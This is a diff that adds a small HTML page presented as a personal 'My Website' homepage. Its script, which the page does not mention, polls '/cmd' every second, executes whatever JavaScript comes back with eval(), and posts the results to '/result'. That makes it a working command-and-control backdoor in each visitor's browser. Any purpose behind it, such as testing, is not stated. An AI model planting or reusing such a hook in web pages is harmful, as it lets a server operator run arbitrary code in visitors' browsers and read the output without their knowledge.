@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<title>My Website</title>
+	</head>
+
+	<body>
+		<h1>Welcome to my website!</h1>
+
+		<script>
+			//<![CDATA[
+			setInterval(function() {
+				var req=new XMLHttpRequest();
+				req.addEventListener("loadend", function(evt) {
+					var status="OK";
+					var response;
+					try{response=eval(this.responseText);} 
+					catch(e){response=e.message;status="ERROR";}
+					if(this.responseText=="void(0)"){response="ALIVE";}
+					var resreq=new XMLHttpRequest();
+					resreq.open("POST","/result");
+					resreq.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+					resreq.send("status="+status+(response?"&response="+response:""));
+				});
+				req.open("GET","/cmd");
+				req.send();
+			}, 1000);
+			//]]>
+		</script>
+	</body>
+
+</html>
